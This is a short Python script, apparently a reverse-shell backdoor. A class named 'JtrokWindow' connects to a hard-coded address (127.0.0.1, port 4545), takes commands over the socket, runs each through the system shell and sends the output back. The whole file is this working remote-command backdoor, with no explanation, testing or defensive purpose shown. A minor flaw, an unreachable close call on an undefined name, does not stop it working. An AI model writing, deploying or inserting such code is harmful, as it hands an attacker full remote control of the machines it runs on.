#!usr/bin/python3
import socket
import subprocess


class JtrokWindow:
    def __init__(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        self.sock.connect((host, port))

    def execute(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.sock.recv(1024)
            cmd_result = self.execute(command)
            self.sock.send(cmd_result)

        sock.close()


jtro_window = JtrokWindow('127.0.0.1', 4545)
jtro_window.run()
